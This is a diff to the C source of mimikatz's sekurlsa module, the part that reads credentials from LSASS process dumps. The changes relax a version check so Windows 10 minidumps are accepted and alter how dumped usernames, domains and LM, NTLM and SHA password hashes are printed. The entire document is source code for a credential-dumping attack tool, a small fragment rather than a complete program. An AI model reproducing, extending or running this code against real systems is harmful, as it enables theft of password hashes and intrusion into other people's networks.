@@ -173,7 +173,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
 							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
 
-							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION))
+							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion == 10))
 								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
 						#ifdef _M_X64
 							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
@@ -491,6 +491,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	UNICODE_STRING buffer;
 	PVOID base;
 	DWORD type, i;
+	BOOL isNull = FALSE;
 	
 	if(mesCreds)
 	{
@@ -534,6 +535,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 
 					kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
 					kprintf(L"\n\t * Flags    : %02x/N%02x/L%02x/S%02x/%02x/%02x/%02x/%02x", pPrimaryCreds10->isUnk0, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword, pPrimaryCreds10->isUnk1, pPrimaryCreds10->isUnk2, pPrimaryCreds10->isUnk3, pPrimaryCreds10->isUnk4);
+					//kprintf(L"\n\t * Flags    : %02x/N%02x/L%02x/S%02x/%02x/%02x", pPrimaryCreds10->isUnk0, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword, pPrimaryCreds10->isUnk1, pPrimaryCreds10->isUnk2);
 					if(pPrimaryCreds10->isLmOwfPassword)
 					{
 						kprintf(L"\n\t * LM       : ");
@@ -550,7 +552,12 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						kull_m_string_wprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
 					}
 					kprintf(L"\n\t * unknow   : ");
-					kull_m_string_wprintf_hex(pPrimaryCreds10->UnkStruct, 128, 0);
+					for(i = 0; !isNull && (i < 128); i++)
+						isNull |= !pPrimaryCreds10->UnkStruct[i];
+					if(isNull)
+						kprintf(L"[0..0]");
+					else
+						kull_m_string_wprintf_hex(pPrimaryCreds10->UnkStruct, 128, 0);
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
 					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
